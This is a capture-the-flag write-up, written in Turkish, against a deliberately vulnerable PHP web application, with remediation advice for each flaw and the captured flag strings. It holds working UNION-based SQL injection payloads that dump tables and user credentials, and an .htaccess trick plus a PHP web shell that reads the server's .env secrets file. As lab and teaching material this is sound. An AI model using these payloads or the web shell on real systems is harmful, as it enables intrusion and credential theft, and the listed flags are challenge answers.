1. ZAFİYET: SQL INJECTION İLE VERİ SIZDIRMA
--------------------------------------------------
Hedef Dosya: /index.php

Hata Mesajı:
Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in /var/www/html/index.php on line 27

Exploit Adımları:
- ' UNION SELECT "i", table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database()--  
→ Veritabanındaki tablolar listelendi.  
- ' UNION SELECT "i", column_name, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='flags'--  
→ "flags" tablosunun sütunları bulundu.  
- ' UNION SELECT "i", flag_value, NULL, NULL, NULL, NULL FROM flags--  
→ "flags" tablosundan flag verileri çekildi.

Elde Edilen Bayrak:
- YZT_FLAG1{f94222bbb8976f1a753a25be2c81384a}
- YZT_FLAG1{b2e605ed389aef58002aa7132ad26d98}

Güvenlik Açığı:
- Kullanıcı girişinde SQL sorguları doğrudan veri tabanına gönderilmiş.
- Parametrelenmiş sorgular (prepared statements) kullanılmamış.
- Veritabanı yapılarına yetkisiz erişim mümkün.

Önerilen Önlemler:
- SQL sorguları için mysqli_prepare() veya PDO kullanılmalı.
- Hata mesajları kullanıcıya gösterilmemeli.
- Uygulama dışına veri sızmasını önlemek için bilgi ifşası engellenmeli.

==================================================
2. ZAFİYET: ZAYIF KİMLİK DOĞRULAMA VE HASH KULLANIMI
--------------------------------------------------
Hedef Endpoint: /admin/user_info.php?user_id=...

Exploit Adımları:
- "users" tablosundan kullanıcı adları ve şifreler çekildi:
  ' UNION SELECT "i", column_name, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
  ' UNION SELECT "i", username, NULL, NULL, NULL, NULL FROM users--  
  ' UNION SELECT "i", password, NULL, NULL, NULL, NULL FROM users--  
- Hash çözümleme ile kullanıcı şifresi elde edildi:
  MD5("4") = a87ff679a2f3e71d9181a67b7542122c
  MD5("1") = c4ca4238a0b923820dcc509a6f75849b
- `user_id` parametresine MD5 hash verilerek doğrudan kullanıcı verisine ulaşıldı.

Elde Edilen Bayrak:
- YZT_FLAG2{998be3c05163e29054a6a0a82afd6435}

Güvenlik Açığı:
- Kimlik doğrulamada MD5 gibi zayıf algoritmalar kullanılmış.
- `user_id` gibi parametreler hash ile kontrol edildiği için tahmin edilebiliyor.
- Kimlik doğrulama kontrolleri eksik veya yetersiz.

Önerilen Önlemler:
- MD5 yerine bcrypt, SHA-256 veya argon2 kullanılmalı.
- Kimlik doğrulama, token ve session bazlı yapılmalı.
- Erişim kontrolü sağlamlaştırılmalı.

==================================================
3. ZAFİYET: DOSYA YÜKLEME VE RCE (Remote Code Execution)
--------------------------------------------------
Yüklenen .htaccess dosyası:
```
AddType application/x-httpd-php .shell
```

Yüklenen PHP Dosyası:
```
<?php 
$output = shell_exec('cat ../../.env'); 
echo "<pre>$output</pre>"; 
?>
```

Exploit Adımları:
- Bu dosya HTTP POST ile `file` parametresi kullanılarak yüklendi:
  Content-Disposition: form-data; name="file"; filename="patatest.php"
- Daha sonra aşağıdaki GET isteği ile dosya çalıştırıldı:
  GET /admin/uploads/patatest.php HTTP/1.1

Elde Edilen Bayrak:
- YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d}

Güvenlik Açığı:
- PHP dosyaları yüklendikten sonra doğrudan çalıştırılabiliyor.
- Web sunucusunda .env gibi hassas dosyalar erişilebilir durumda.
- shell_exec gibi kritik fonksiyonlar devrede.

Önerilen Önlemler:
- Dosya uzantısı ve MIME türü doğrulaması yapılmalı.
- Upload klasörü script çalıştırılamayacak şekilde yapılandırılmalı (örneğin `.htaccess` ile).
- PHP fonksiyonları `shell_exec`, `exec`, `system` gibi komut çalıştırıcılar devre dışı bırakılmalı.
- .env, .git gibi kritik dosyaların erişimi kısıtlanmalı.
- NTFS izinleriyle "Everyone" grubunun yazma ve çalıştırma yetkileri sınırlandırılmalı.

==================================================
SONUÇ:
Bu web uygulaması; SQL Injection, zayıf kimlik doğrulama ve dosya yükleme zaafiyetlerine karşı savunmasızdır. Bu zafiyetler zincirleme olarak kullanıldığında saldırganın sisteme tam yetkiyle erişmesine neden olabilir. Özellikle .env dosyasına erişim ve shell komutlarının çalıştırılabilmesi, sistemde ciddi bir Remote Code Execution (RCE) riski doğurmaktadır.

Toplamda Elde Edilen Bayraklar:
- YZT_FLAG1{f94222bbb8976f1a753a25be2c81384a}
- YZT_FLAG1{b2e605ed389aef58002aa7132ad26d98}
- YZT_FLAG2{998be3c05163e29054a6a0a82afd6435}
- YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d}
